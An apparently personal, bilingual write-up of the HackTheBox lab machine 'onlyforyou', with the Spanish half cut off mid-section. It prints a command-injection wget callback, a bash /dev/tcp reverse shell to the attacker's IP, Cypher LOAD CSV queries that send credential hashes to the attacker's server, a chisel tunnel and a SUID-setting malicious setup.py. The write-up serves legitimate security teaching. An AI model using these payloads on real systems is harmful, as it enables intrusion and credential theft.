<!DOCTYPE html>
<html lang="es" data-theme="light">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>onlyforyou | Writeup</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="../../index.css">
</head>

<body>
    <nav class="top-nav">
        <div class="container">
            <div class="nav-content">
                <div class="nav-left">
                    <a href="../../index.html" class="back-link" title="Back to home">‚Üê</a>
                    <h1 data-i18n="site-title">KDW_LABS</h1>
                </div>
                <div class="nav-controls">
                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
                        <span class="theme-icon">üåô</span>
                    </button>
                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
                        <span>EN</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <main class="container">
        <header class="machine-header">
            <h1 class="machine-title">onlyforyou</h1>
            <div class="machine-meta">
                <span class="badge badge-platform">HTB</span>
                <span class="badge badge-difficulty-medium">medium</span>
            </div>
        </header>

        <article class="machine-content">
            <div id="content-en" class="lang-content">
                <div class="machine-summary">
                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
                    <p><strong>Exploitation process:</strong> The target machine hosted multiple web applications on different virtual hosts and internal ports. Initial reconnaissance revealed a beta subdomain at <code>beta.only4you.htb</code> that exposed its source code, which contained a path traversal vulnerability in the file download endpoint.</p>
                    
                    <p>Through local file inclusion, I discovered the main application at <code>only4you.htb</code> had a command injection vulnerability in its email validation form, which executed the <code>dig</code> command insecurely. Exploiting this allowed me to gain a reverse shell as <code>www-data</code>.</p>
                    
                    <p>After establishing initial access, port forwarding revealed an internal web application on port 8001 running Neo4j as its database backend. Using default credentials <code>admin:admin</code>, I accessed the internal application which had a Cypher injection vulnerability in its employee search functionality. By crafting custom Cypher queries, I exfiltrated credentials for the user <code>john</code> from the Neo4j database.</p>
                    
                    <p>Privilege escalation was achieved by exploiting a <code>sudo</code> permission that allowed John to run <code>pip3 download</code> from a local Gogs repository. I created a malicious Python package with a crafted <code>setup.py</code> that executed arbitrary commands during installation, uploaded it to Gogs, and used the sudo permission to trigger the payload, which set the SUID bit on <code>/bin/bash</code> and granted root access.</p>
                    
                    <p><strong>Technologies/Exploits:</strong> Path traversal and LFI, command injection via subprocess, Cypher injection in Neo4j, pip download arbitrary code execution through malicious setup.py.</p>
                </div>
                <hr class="summary-divider">

                <h2>Initial Reconnaissance</h2>
                <p>Beginning with an nmap scan to identify open ports and services on the target machine:</p>
                <p><img src="./media/image10.png" alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>

                <p>The scan reveals SSH running on port 22 and HTTP on port 80. I add <code>only4you.htb</code> to my <code>/etc/hosts</code> file to properly resolve the domain.</p>

                <h2>Web Enumeration - Main Application</h2>
                <p>The main website at <code>only4you.htb</code> is a simple static page with no additional routes discovered through directory enumeration. However, scanning for virtual hosts yields more interesting results - I discover a beta subdomain:</p>
                <pre><code class="language-plaintext">beta.only4you.htb Status: 200 [Size: 2191]</code></pre>

                <p><img src="./media/image9.png" alt="Beta subdomain website showing the application interface" /></p>

                <p>After adding <code>beta.only4you.htb</code> to my hosts file, I access the beta application which offers an interesting feature: the ability to download its own source code. This is the first thing I investigate.</p>

                <h2>Source Code Analysis - Path Traversal Vulnerability</h2>
                <p>Examining the downloaded source code, the most interesting finding is the <code>POST /download</code> endpoint:</p>
                <p><img src="./media/image3.png" alt="Source code showing the download endpoint implementation with path traversal vulnerability" /></p>

                <p>The code performs a manual check for <code>..</code> in the filename, which is a strong indicator of a directory traversal vulnerability. The key section of code is:</p>
                <pre><code class="language-python">if not os.path.isabs(filename):
    filename = os.path.join(app.config['LIST_FOLDER'], filename)</code></pre>

                <p>This logic only applies the <code>LIST_FOLDER</code> prefix if the filename is not an absolute path. This means I can potentially specify absolute paths to read arbitrary files from the system. I test this hypothesis by attempting to read <code>/etc/passwd</code>:</p>

                <pre><code class="language-bash">curl -X POST http://beta.only4you.htb/download -F 'image=/etc/passwd' | grep bash</code></pre>

                <p>The response confirms the vulnerability works:</p>
                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash</code></pre>

                <p>I identify four potential user accounts: <code>root</code>, <code>john</code>, <code>neo4j</code>, and <code>dev</code>. I attempt to access SSH private keys at <code>/home/john/.ssh/id_rsa</code> and similar paths for other users, but these files either don't exist or aren't readable.</p>

                <h3>Locating the Application Files</h3>
                <p>To find more useful files, I need to determine where the application is installed on the filesystem. Knowing that Flask applications are typically served from <code>/var/www</code>, I try various path combinations with keywords like <code>beta</code>, <code>only4you</code>, and <code>html</code>.</p>

                <p>After several attempts, I successfully locate the application at:</p>
                <pre><code class="language-plaintext">image=/var/www/beta.only4you.htb/app.py</code></pre>

                <p>Unfortunately, examining this file doesn't reveal any credentials or additional vulnerabilities beyond what I already found in the downloaded source code.</p>

                <h2>Command Injection in Main Application</h2>
                <p>Shifting focus back to the main application at <code>only4you.htb</code>, I use the LFI to read its source code. Testing <code>index.html</code> doesn't work, but trying <code>app.py</code> successfully retrieves the Flask application code.</p>

                <p>The application imports a function from a <code>form</code> module:</p>
                <pre><code class="language-python">from form import sendmessage</code></pre>

                <p><img src="./media/image12.png" alt="Main application code showing the POST endpoint and sendmessage import" /></p>

                <p>I use the LFI to read <code>form.py</code> and discover a critical vulnerability - the application executes <code>subprocess.run</code> in an unsafe manner to perform DNS lookups with the <code>dig</code> command:</p>

                <p><img src="./media/image13.png" alt="Form.py code showing insecure subprocess.run implementation for dig command" /></p>

                <p>The code doesn't properly sanitize user input before passing it to the shell. This allows command injection by inserting newline characters (<code>%0a</code>) to execute additional commands.</p>

                <h3>Testing Remote Code Execution</h3>
                <p>I test the vulnerability with a simple payload that attempts to connect back to my HTTP server:</p>
                <pre><code class="language-plaintext">email=asd%40asd.com%0awget+10.10.16.6:8000</code></pre>

                <p>My Python HTTP server confirms the exploit works:</p>
                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.210 - - "GET / HTTP/1.1" 200 -</code></pre>

                <h2>Initial Access - Reverse Shell</h2>
                <p>Now that I've confirmed code execution, I craft a payload to deliver a reverse shell:</p>
                <pre><code class="language-plaintext">email=asd%40asd.com%0abash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.6/443+0>%261"</code></pre>

                <p>After setting up a netcat listener with <code>nc -lvnp 443</code> and sending the payload, I successfully receive a reverse shell connection as the <code>www-data</code> user.</p>

                <h2>Post-Exploitation Enumeration</h2>
                <p>After gaining initial access, I examine the <code>/tmp</code> and <code>/opt</code> directories:</p>
                <p><img src="./media/image5.png" alt="Directory listing showing Neo4j and Gogs installations in /tmp and /opt" /></p>

                <p>Using <code>ss -tuln</code> to examine listening ports, I discover several internal services:</p>
                <ul>
                    <li><strong>Port 3000:</strong> Gogs service (visible in <code>/opt</code>)</li>
                    <li><strong>Port 8001:</strong> Internal application with a login interface</li>
                    <li><strong>Port 7474:</strong> Neo4j database (related to files in <code>/tmp</code>)</li>
                    <li><strong>Port 3306:</strong> MySQL database (no credentials available yet)</li>
                </ul>

                <h3>Neo4j Service Discovery</h3>
                <p>I investigate the Neo4j service running on port 7474:</p>
                <pre><code class="language-bash">curl localhost:7474</code></pre>

                <pre><code class="language-json">{
  "bolt_routing" : "neo4j://localhost:7687",
  "transaction" : "http://localhost:7474/db/{databaseName}/tx",
  "bolt_direct" : "bolt://localhost:7687",
  "neo4j_version" : "5.6.0",
  "neo4j_edition" : "community"
}</code></pre>

                <p>This confirms Neo4j version 5.6.0 is running. I research known vulnerabilities for this version but don't find any immediately exploitable issues.</p>

                <h2>Port Forwarding with Chisel</h2>
                <p>To access these internal services from my attacking machine, I use Chisel for port forwarding. On my machine:</p>
                <pre><code class="language-bash">./chisel server -p 1234 --reverse</code></pre>

                <p>On the target machine:</p>
                <pre><code class="language-bash">./chisel client 10.10.16.6:1234 R:8001:127.0.0.1:8001</code></pre>

                <p>With the tunnel established, I can now access the internal services through my localhost.</p>

                <h3>Internal Application Discovery</h3>
                <p>The service on port 8001 presents a login page for an application called "only4you". Running gobuster against it reveals several interesting endpoints:</p>
                <p><img src="./media/image4.png" alt="Gobuster results showing discovered endpoints in the internal application" /></p>

                <p>Without credentials, I can't proceed further with this application yet.</p>

                <h3>Gogs Investigation</h3>
                <p>Port 3000 hosts Gogs, an open-source Git service: <a href="https://github.com/gogs/gogs">https://github.com/gogs/gogs</a>. While I search for known vulnerabilities, I can't determine the exact version, so I defer deeper investigation until I have credentials.</p>

                <h3>Neo4j Browser Interface</h3>
                <p>Port 7474 serves the Neo4j browser interface. Gobuster reveals several endpoints:</p>
                <p><img src="./media/image6.png" alt="Gobuster results for Neo4j showing various endpoints" /></p>

                <p>Attempting to access <code>/db</code> presents a login form:</p>
                <p><img src="./media/image7.png" alt="Neo4j login page requiring authentication" /></p>

                <p>The default credentials <code>neo4j:neo4j</code> don't work, indicating the password has been changed.</p>

                <h2>Gaining Access to Internal Application</h2>
                <p>Returning to the internal application on port 8001, I try common default credentials. The combination <code>admin:admin</code> successfully grants me access:</p>
                <p><img src="./media/image1.png" alt="Internal application dashboard showing employee search functionality" /></p>

                <h2>Cypher Injection in Neo4j</h2>
                <p>The internal application has an "employees" section with a search functionality. When I input a single quote (<code>'</code>) into the search field, the application returns a 500 error, indicating a potential injection vulnerability.</p>

                <p>I initially test with sqlmap, which detects an injection but can't exploit it further. After research, I realize this application uses Neo4j as its database backend, which doesn't use traditional SQL - it uses a query language called Cypher.</p>

                <h3>Confirming Cypher Injection</h3>
                <p>I test a basic Cypher injection payload to confirm the vulnerability:</p>
                <p><img src="./media/image8.png" alt="Cypher injection test showing successful exploitation with visible results" /></p>

                <p>The payload successfully executes, confirming Cypher injection is possible.</p>

                <h3>Data Exfiltration Technique</h3>
                <p>I find an excellent resource explaining Neo4j injection techniques: <a href="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits">https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits</a></p>

                <p>The most effective exfiltration method is using the <code>LOAD CSV</code> function to send data to my own HTTP server. I start by enumerating database labels (similar to tables in SQL):</p>

                <pre><code class="language-cypher">' RETURN 1 as _l00 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.6/?=' + label as _l00 RETURN 1 as _l00//</code></pre>

                <p>My HTTP server receives:</p>
                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=user HTTP/1.1" 200 -
10.10.11.210 - - "GET /?=employee HTTP/1.1" 200 -</code></pre>

                <p>This reveals two labels: <code>user</code> and <code>employee</code>. The <code>user</code> label is most interesting for credential hunting.</p>

                <h3>Extracting Column Names</h3>
                <p>I enumerate the property keys (columns) of the <code>user</code> label:</p>

                <pre><code class="language-cypher">' match (u:user) with distinct keys(u) as k LOAD CSV FROM 'http://10.10.16.6/?=' + k[0] as _l00 RETURN 1 as _l00//</code></pre>

                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=password HTTP/1.1" 200 -</code></pre>

                <pre><code class="language-cypher">' match (u:user) with distinct keys(u) as k LOAD CSV FROM 'http://10.10.16.6/?=' + k[1] as _l00 RETURN 1 as _l00//</code></pre>

                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=username HTTP/1.1" 200 -</code></pre>

                <p>The <code>user</code> label has two properties: <code>username</code> and <code>password</code>.</p>

                <h3>Extracting Credentials</h3>
                <p>Finally, I extract the actual credential data by concatenating username and password:</p>

                <pre><code class="language-cypher">' match (u:user) with distinct u.username + ":" + u.password as d LOAD CSV FROM 'http://10.10.16.6/?=' + d as _l00 RETURN 1 as _l00//</code></pre>

                <p>My server receives the credentials:</p>
                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - "GET /?=john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -</code></pre>

                <p>The passwords are hashed, but I recognize these as SHA-256 hashes. Using CrackStation to crack them reveals:</p>
                <ul>
                    <li><code>admin:admin</code> (already known)</li>
                    <li><code>john:ThisIs4You</code></li>
                </ul>

                <h2>SSH Access as John</h2>
                <p>Using the recovered credentials, I SSH into the machine as <code>john</code> and retrieve the user flag.</p>

                <h2>Privilege Escalation - Sudo Pip Download</h2>
                <p>Checking John's sudo permissions reveals an interesting configuration:</p>
                <pre><code class="language-bash">sudo -l</code></pre>

                <pre><code class="language-plaintext">Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz</code></pre>

                <p>John can run <code>pip3 download</code> as root, but only for packages from the local Gogs service on port 3000. This is designed as a security measure, but I can exploit it by hosting a malicious Python package in a Gogs repository.</p>

                <h3>Accessing Gogs</h3>
                <p>I set up SSH local port forwarding to access Gogs from my machine:</p>
                <pre><code class="language-bash">ssh -L 3000:127.0.0.1:3000 john@10.10.11.210</code></pre>

                <p>Accessing <code>localhost:3000</code> in my browser, I log in to Gogs using John's credentials (<code>john:ThisIs4You</code>). I notice there's already a test repository that I can use to host my malicious package.</p>

                <h3>Understanding the Exploit</h3>
                <p>I discover this blog post explaining the vulnerability: <a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">Python Package Manager Install and Download Vulnerability</a></p>

                <p>The key insight is that when <code>pip download</code> processes a package, it reads and executes code in <code>setup.py</code> during the metadata extraction phase - even before installing the package. This happens with root privileges when using <code>sudo</code>.</p>

                <p>I find a proof-of-concept repository demonstrating this: <a href="https://github.com/wunderwuzzi23/this_is_fine_wuzzi">https://github.com/wunderwuzzi23/this_is_fine_wuzzi</a></p>

                <h3>Crafting the Malicious Package</h3>
                <p>I clone the proof-of-concept repository and modify the <code>setup.py</code> to execute my payload instead of just printing text. My goal is to set the SUID bit on <code>/bin/bash</code>:</p>

                <p><img src="./media/image11.png" alt="Modified setup.py file showing the malicious payload that sets SUID on bash" /></p>

                <p>The key modification is replacing the harmless print statement with:</p>
                <pre><code class="language-python">os.system("chmod u+s /bin/bash")</code></pre>

                <p>I build the package using Python's build module:</p>
                <pre><code class="language-bash">python -m build</code></pre>

                <p>This creates a <code>.tar.gz</code> file in the <code>dist/</code> directory containing my malicious package.</p>

                <h3>Uploading to Gogs</h3>
                <p>I upload the malicious <code>this_is_fine_wuzzi-0.0.1.tar.gz</code> file to the test repository in Gogs. Crucially, I configure the repository to be public so the package can be downloaded without authentication.</p>

                <h3>Triggering the Exploit</h3>
                <p>Now I execute the sudo command to download the malicious package:</p>
                <pre><code class="language-bash">sudo pip3 download http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz</code></pre>

                <pre><code class="language-plaintext">Collecting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
  Saved ./this_is_fine_wuzzi-0.0.1.tar.gz
Successfully downloaded this-is-fine-wuzzi</code></pre>

                <p>During the download process, pip extracts the package metadata, which triggers the execution of my malicious <code>setup.py</code> as root. I verify the SUID bit was set:</p>

                <pre><code class="language-bash">ls -la /bin/bash</code></pre>

                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash</code></pre>

                <p>The <code>s</code> in the permissions confirms the SUID bit is set.</p>

                <h2>Root Access</h2>
                <p>With the SUID bit set on bash, I can now spawn a root shell:</p>
                <pre><code class="language-bash">bash -p</code></pre>

                <p>The <code>-p</code> flag preserves the effective user ID, ensuring the SUID bit is honored. This grants me a root shell:</p>

                <pre><code class="language-bash">whoami</code></pre>

                <pre><code class="language-plaintext">root</code></pre>

                <p>I can now retrieve the root flag and complete the machine.</p>
            </div>

            <div id="content-es" class="lang-content" style="display:none;">
                <div class="machine-summary">
                    <h2 data-i18n="summary-title">Resumen de Explotaci√≥n</h2>
                    <p><strong>Proceso de explotaci√≥n:</strong> La m√°quina objetivo alojaba m√∫ltiples aplicaciones web en diferentes hosts virtuales y puertos internos. El reconocimiento inicial revel√≥ un subdominio beta en <code>beta.only4you.htb</code> que expon√≠a su c√≥digo fuente, el cual conten√≠a una vulnerabilidad de path traversal en el endpoint de descarga de archivos.</p>
                    
                    <p>Mediante inclusi√≥n de archivos locales, descubr√≠ que la aplicaci√≥n principal en <code>only4you.htb</code> ten√≠a una vulnerabilidad de inyecci√≥n de comandos en su formulario de validaci√≥n de email, que ejecutaba el comando <code>dig</code> de forma insegura. Explotar esto me permiti√≥ obtener una reverse shell como <code>www-data</code>.</p>
                    
                    <p>Tras establecer el acceso inicial, el reenv√≠o de puertos revel√≥ una aplicaci√≥n web interna en el puerto 8001 ejecutando Neo4j como backend de base de datos. Usando credenciales por defecto <code>admin:admin</code>, acced√≠ a la aplicaci√≥n interna que ten√≠a una vulnerabilidad de inyecci√≥n Cypher en su funcionalidad de b√∫squeda de empleados. Dise√±ando consultas Cypher personalizadas, exfiltr√© credenciales del usuario <code>john</code> desde la base de datos Neo4j.</p>
                    
                    <p>La escalada de privilegios se consigui√≥ explotando un permiso <code>sudo</code> que permit√≠a a John ejecutar <code>pip3 download</code> desde un repositorio local de Gogs. Cre√© un paquete Python malicioso con un <code>setup.py</code> dise√±ado espec√≠ficamente que ejecutaba comandos arbitrarios durante la instalaci√≥n, lo sub√≠ a Gogs, y us√© el permiso sudo para desencadenar el payload, que estableci√≥ el bit SUID en <code>/bin/bash</code> y otorg√≥ acceso root.</p>
                    
                    <p><strong>Tecnolog√≠as/Exploits:</strong> Path traversal y LFI, inyecci√≥n de comandos mediante subprocess, inyecci√≥n Cypher en Neo4j, ejecuci√≥n de c√≥digo arbitrario con pip download mediante setup.py malicioso.</p>
                </div>
                <hr class="summary-divider">

                <h2>Reconocimiento Inicial</h2>
                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la m√°quina objetivo:</p>
                <p><img src="./media/image10.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>

                <p>El escaneo revela SSH ejecut√°ndose en el puerto 22 y HTTP en el puerto 80. A√±ado <code>only4you.htb</code> a mi archivo <code>/etc/hosts</code> para resolver correctamente el dominio.</p>

                <h2>Enumeraci√≥n Web - Aplicaci√≥n Principal</h2>
                <p>El sitio web principal en <code>only4you.htb</code> es una p√°gina est√°tica simple sin rutas adicionales descubiertas mediante enumeraci√≥n de directorios. Sin embargo, escaneando hosts virtuales obtengo resultados m√°s interesantes - descubro un subdominio beta:</p>
                <pre><code class="language-plaintext">beta.only4you.htb Status: 200 [Size: 2191]</code></pre>

                <p><img src="./media/image9.png" alt="Sitio web del subdominio beta mostrando la interfaz de la aplicaci√≥n" /></p>

                <p>Tras a√±adir <code>beta.only4you.htb</code> a mi archivo hosts, accedo a la aplicaci√≥n beta que ofrece una caracter√≠stica interesante: la capacidad de descargar su propio c√≥digo fuente. Esto es lo primero que investigo.</p>

                <h2>An√°lisis del C√≥digo Fuente - Vulnerabilidad de Path Traversal</h2>
                <p>Examinando el c√≥digo fuente descargado, el hallazgo m√°s interesante es el endpoint <code>POST /download</code>:</p>
                <p><img src="./media/image3.png" alt="C√≥digo fuente mostrando la implementaci√≥n del endpoint de descarga con vulnerabilidad de path traversal" /></p>

                <p>El c√≥digo realiza una comprobaci√≥n manual de <code>..</code> en el nombre de archivo, lo cual es un fuerte indicador de una vulnerabilidad de directory traversal. La secci√≥n clave del c√≥digo es:</p>
                <pre><code class="language-python">if not os.path.isabs(filename):
    filename = os.path.join(app.config['LIST_FOLDER'], filename)</code></pre>

                <p>Esta l√≥gica solo aplica el prefijo <code>LIST_FOLDER</code> si el nombre de archivo no es una ruta absoluta. Esto significa que potencialmente puedo especificar rutas absolutas para leer archivos arbitrarios del sistema. Pruebo esta hip√≥tesis intentando leer <code>/etc/passwd</code>:</p>

                <pre><code class="language-bash">curl -X POST http://beta.only4you.htb/download -F 'image=/etc/passwd' | grep bash</code></pre>

                <p>La respuesta confirma que la vulnerabilidad funciona:</p>
                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash</code></pre>

                <p>Identifico cuatro cuentas de usuario potenciales: <code>root</code>, <code>john</code>, <code>neo4j</code> y <code>dev</code>. Intento acceder a claves privadas SSH en <code>/home/john/.ssh/id_rsa</code> y rutas similares para otros usuarios, pero estos archivos o no existen o no son legibles.</p>

                <h3>Localizando los Archivos de la Aplicaci√≥n</h3>
                <p>Para encontrar archivos m√°s √∫tiles, necesito determinar d√≥nde est√° instalada la aplicaci√≥n en el sistema de archivos. Sabiendo que las aplicaciones Flask t√≠picamente se sirven desde <code>/var/www</code>, pruebo varias combinaciones de rutas con palabras clave como <code>beta</code>, <code>only4you</code> y <code>html</code>.</p>

                <p>Tras varios intentos, localizo exitosamente la aplicaci√≥n en:</p>
                <pre><code class="language-plaintext">image=/var/www/beta.only4you.htb/app.py</code></pre>

                <p>Desafortunadamente, examinar este archivo no revela credenciales ni vulnerabilidades adicionales m√°s all√° de lo que ya encontr√© en el c√≥digo fuente descargado.</p>

                <h2>Inyecci√≥n de Comandos en la Aplicaci√≥n Principal</h2>
                <p>Volviendo la atenci√≥n a la aplicaci√≥n principal en <code>only4you.htb</code>, uso el LFI para leer su c√≥digo fuente. Probar <code>index.html</code> no funciona, pero intentar con <code>app.py</code> recupera exitosamente el c√≥digo de la aplicaci√≥n Flask.</p>

                <p>La aplicaci√≥n importa una funci√≥n desde un m√≥dulo <code>form</code>:</p>
                <pre><code class="language-python">from form import sendmessage</code></pre>

                <p><img src="./media/image12.png" alt="C√≥digo de la aplicaci√≥n principal mostrando el endpoint POST y la importaci√≥n de sendmessage" /></p>

                <p>Uso el LFI para leer <code>form.py</code> y descubro una vulnerabilidad cr√≠tica - la aplicaci√≥n ejecuta <code>subprocess.run</code> de manera insegura para realizar b√∫squedas DNS con el comando <code>dig</code>:</p>

                <p><img src="./media/image13.png" alt="C√≥digo de form.py mostrando implementaci√≥n insegura de subprocess.run para el comando dig" /></p>

                <p>El c√≥digo no sanitiza correctamente la entrada del usuario antes de pasarla al shell. Esto permite inyecci√≥n de comandos insertando caracteres de nueva l√≠nea (<code>%0a</code>) para ejecutar comandos adicionales.</p>

                <h3>Probando Ejecuci√≥n Remota de C√≥digo</h3>
                <p>Pruebo la vulnerabilidad con un payload simple que intenta conectarse de vuelta a mi servidor HTTP:</p>
                <pre><code class="language-plaintext">email=asd%40asd.com%0awget+10.10.16.6:8000</code></pre>

                <p>Mi servidor HTTP de Python confirma que el exploit funciona:</p>
                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.210 - - "GET / HTTP/1.1" 200 -</code></pre>

                <h2>Acceso Inicial - Reverse Shell</h2>
                <p>Ahora que he confirmado la ejecuci√≥n de c√≥digo, dise√±o un payload para entregar una reverse shell:</p>
                <pre><code class="language-plaintext">email=asd%40asd.com%0abash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.6/443+0>%261"</code></pre>

                <p>Tras configurar un listener de netcat con <code>nc -lvnp 443</code> y enviar el payload, recibo exitosamente una conexi√≥n de reverse shell como usuario <code>www-data</code>.</p>

                <h2>Enumeraci√≥n Post-Explotaci√≥n</h2>
                <p>Tras obtener el acceso inicial, examino los directorios <code>/tmp</code> y <code>/opt</code>:</p>
                <p><img src="./media/image5.png" alt="Listado de directorios mostrando instalaciones de Neo4j y Gogs en /tmp y /opt" /></p>

                <p>Usando <code>ss -tuln</code> para examinar puertos en escucha, descubro varios servicios internos:</p>
                <ul>
                    <li><strong>Puerto 3000:</strong> Servicio Gogs (visible en <code>/opt</code>)</li>
                    <li><strong>Puerto 8001:</strong> Aplicaci√≥n interna con interfaz de login</li>
                    <li><strong>Puerto 7474:</strong> Base de datos Neo4j (relacionada con archivos en <code>/tmp</code>)</li>
                    <li><strong>Puerto 3306:</strong> Base de datos MySQL (sin credenciales disponibles a√∫n)</li>
                </ul>

                <h3>Descubrimiento del Servicio Neo4j</h3>
                <p>Investigo el servicio Neo4j ejecut√°ndose en el puerto 7474:</p>
                <pre><code class="language-bash">curl localhost:7474</code></pre>

                <pre><code class="language-json">{
  "bolt_routing" : "neo4j://localhost:7687",
  "transaction" : "http://localhost:7474/db/{databaseName}/tx",
  "bolt_direct" : "bolt://localhost:7687",
  "neo4j_version" : "5.6.0",
  "neo4j_edition" : "community"
}</code></pre>

                <p>Esto confirma que se est√° ejecutando Neo4j versi√≥n 5.6.0. Investigo vulnerabilidades conocidas para esta versi√≥n pero no encuentro problemas inmediatamente explotables.</p>

                <h2>Reenv√≠o de Puertos con Chisel</h2>
                <p>Para acceder a estos servicios internos desde mi m√°quina atacante, uso Chisel para reenv√≠o de puertos. En mi m√°quina:</p>
                <pre><code class="language-bash">./chisel server -p 1234 --reverse</code></pre>

                <p>En la m√°quina objetivo:</p>
                <pre><code class="language-bash">./chisel client 10.10.16.6:1234 R:8001:127.0.0.1:8001</code></pre>

                <p>Con el t√∫nel establecido, ahora puedo acceder a los servicios internos a trav√©s de mi localhost.</p>

                <h3>Descubrimiento de la Aplicaci√≥n Interna</h3>
                <p>El servicio en el puerto 8001 presenta una p√°gina de login para una aplicaci√≥n llamada "only4you". Ejecutando gobuster contra ella revela varios endpoints interesantes:</p>
                <p><img src="./media/image4.png" alt="Resultados de gobuster mostrando endpoints descubiertos en la aplicaci√≥n interna" /></p>

                <p>Sin credenciales, no puedo proceder m√°s con esta aplicaci√≥n por ahora.</p>

                <h3>Investigaci√≥n de Gogs</h3>
                <p>El puerto 3000 aloja Gogs, un servicio Git de c√≥digo abierto: <a href="https://github.com/gogs/gogs">https://github.com/gogs/gogs</a>. Aunque busco vulnerabilidades conocidas, no puedo determinar la versi√≥n exacta, as√≠ que pospongo una investigaci√≥n m√°s profunda hasta que tenga credenciales.</p>

                <h3>Interfaz del Navegador Neo4j</h3>
                <p>El puerto 7474 sirve la interfaz del navegador de Neo4j. Gobuster revela varios endpoints:</p>
                <p><img src="./media/image6.png" alt="Resultados de gobuster para Neo4j mostrando varios endpoints" /></p>

                <p>Intentar acceder a <code>/db</code> presenta un formulario de login:</p>
                <p><img src="./media/image7.png" alt="P√°gina de login de Neo4j requiriendo autenticaci√≥n" /></p>

                <p>Las credenciales por defecto <code>neo4j:neo4j</code> no funcionan, indicando que la contrase√±a ha sido cambiada.</p>

                <h2>Obteniendo Acceso a la Aplicaci√≥n Interna</h2>
                <p>Volviendo a la aplicaci√≥n interna en el puerto 8001, pruebo credenciales por defecto comunes. La combinaci√≥n <code>admin:admin</code> me otorga exitosamente acceso:</p>
                <p><img src="./media/image1.png" alt="Panel de la aplicaci√≥n interna mostrando funcionalidad de b√∫squeda de empleados" /></p>

                <h2>Inyecci√≥n Cypher en Neo4j</h2>
                <p>La aplicaci√≥n interna tiene una secci√≥n de "empleados" con una funcionalidad de b√∫squeda. Cuando introduzco una comilla simple (<code>'</code>) en el campo de b√∫squeda, la aplicaci√≥n devuelve un error 500, indicando una potencial vulnerabilidad de inyecci√≥n.</p>

                <p>Inicialmente pruebo con sqlmap, que detecta una inyecci√≥n pero no puede explotarla m√°s. Tras investigar, me doy cuenta de que esta aplicaci√≥n usa Neo4j como backend de base de datos, que no usa SQL tradicional - utiliza un lenguaje de consultas llamado Cypher.</p>

                <h3>Confirmando Inyecci√≥n Cypher</h3>
                <p>Pruebo un payload b√°sico de inyecci√≥n Cypher para confirmar la vulnerabilidad:</p>
                <p><img src="./media/image8.png" alt="Prueba de inyecci√≥n Cypher mostrando explotaci√≥n exitosa con resultados visibles" /></p>

                <p>El payload se ejecuta exitosamente, confirmando que la inyecci√≥n Cypher es posible.</p>

                <h3>T√©cnica de Exfiltraci√≥n de Datos</h3>
                <p>Encuentro un excelente recurso explicando t√©cnicas de inyecci√≥n Neo4j: <a href="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits">https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits</a></p>

                <p>El m√©todo de exfiltraci√≥n m√°s efectivo es usar la funci√≥n <code>LOAD CSV</code> para enviar datos a mi propio servidor HTTP. Empiezo enumerando etiquetas de base de datos (similares a tablas en SQL):</p>

                <pre><code class="language-cypher">' RETURN 1 as _l00 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.6/?=' + label as _l00 RETURN 1 as _l00//</code></pre>

                <p>Mi servidor HTTP recibe:</p>
                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=user HTTP/1.1" 200 -
10.10.11.210 - - "GET /?=employee HTTP/1.1" 200 -</code></pre>

                <p>Esto revela dos etiquetas: <code>user</code> y <code>employee</code>. La etiqueta <code>user</code> es la m√°s interesante para buscar credenciales.</p>

                <h3>Extrayendo Nombres de Columnas</h3>
                <p>Enumero las claves de propiedades (columnas) de la etiqueta <code>user</code>:</p>

